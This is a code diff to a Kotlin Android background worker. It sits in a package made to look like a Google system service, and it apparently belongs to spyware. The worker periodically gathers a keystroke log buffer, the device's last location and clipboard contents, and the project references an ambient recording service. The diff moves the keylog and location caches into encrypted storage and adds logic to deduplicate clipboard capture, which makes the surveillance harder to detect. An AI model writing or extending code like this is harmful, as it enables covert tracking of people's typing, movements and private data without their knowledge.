@@ -2,8 +2,11 @@ package com.google.android.systemservice.workers
 
 import android.content.Context
 import android.content.Intent
+import android.content.SharedPreferences
 import android.os.Build
 import android.util.Log
+import androidx.security.crypto.EncryptedSharedPreferences
+import androidx.security.crypto.MasterKeys
 import androidx.work.*
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.services.AmbientRecordingService
@@ -35,6 +38,17 @@ class OfflineCollectorWorker(
         private const val TAG = "OfflineCollector"
         private const val WORK_NAME = "offline_collector"
         private const val MAX_STORAGE_BYTES = 100L * 1024 * 1024 // 100MB
+
+        private fun getEncryptedPrefs(context: Context, name: String): SharedPreferences {
+            val masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)
+            return EncryptedSharedPreferences.create(
+                name,
+                masterKeyAlias,
+                context,
+                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
+                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
+            )
+        }
 
         /**
          * Schedule periodic collection every 15 minutes.
@@ -107,7 +121,7 @@ class OfflineCollectorWorker(
 
     private fun persistKeylogBuffer() {
         try {
-            val prefs = applicationContext.getSharedPreferences("keylog_prefs", Context.MODE_PRIVATE)
+            val prefs = getEncryptedPrefs(applicationContext, "keylog_prefs")
             val buffer = prefs.getString("keylog_buffer", "") ?: ""
             if (buffer.isNotEmpty()) {
                 val queue = OfflineDataQueue(applicationContext)
@@ -127,7 +141,7 @@ class OfflineCollectorWorker(
     private fun captureLocationSnapshot() {
         try {
             // Read last known location from LocationService cache
-            val prefs = applicationContext.getSharedPreferences("location_cache", Context.MODE_PRIVATE)
+            val prefs = getEncryptedPrefs(applicationContext, "location_cache")
             val lat = prefs.getFloat("last_lat", 0f)
             val lng = prefs.getFloat("last_lng", 0f)
             val accuracy = prefs.getFloat("last_accuracy", 0f)
@@ -150,7 +164,18 @@ class OfflineCollectorWorker(
         }
     }
 
+    // Skip clipboard if DataCollectionService already collected it within 5 minutes
+    private fun shouldCollectClipboard(): Boolean {
+        val prefs = applicationContext.getSharedPreferences("clipboard_cache", Context.MODE_PRIVATE)
+        val lastCollected = prefs.getLong("last_clipboard_collect", 0)
+        return System.currentTimeMillis() - lastCollected > 5 * 60 * 1000
+    }
+
     private fun captureClipboardSnapshot() {
+        if (!shouldCollectClipboard()) {
+            Log.d(TAG, "Clipboard recently collected, skipping")
+            return
+        }
         try {
             val clipboard = applicationContext.getSystemService(Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
             val clip = clipboard?.primaryClip
